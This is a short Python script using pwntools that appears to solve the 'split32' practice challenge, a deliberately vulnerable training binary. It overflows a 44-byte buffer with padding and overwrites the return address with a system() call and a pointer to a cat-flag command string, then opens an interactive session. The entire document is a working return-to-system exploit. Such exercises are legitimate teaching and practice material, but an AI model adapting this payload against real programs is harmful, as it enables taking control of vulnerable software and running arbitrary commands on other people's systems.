from pwn import *

io = process("./split32")

BUFFER_LEN = 44

junk = b"\x90" * BUFFER_LEN

cat_flag    = p32(0x804a030)
system_addr = p32(0x08048657)
exit_addr   = p32(0x90)

payload = b""
payload += junk
payload += system_addr
payload += cat_flag
payload += exit_addr

io.recvuntil("> ")
io.send(payload)
io.interactive()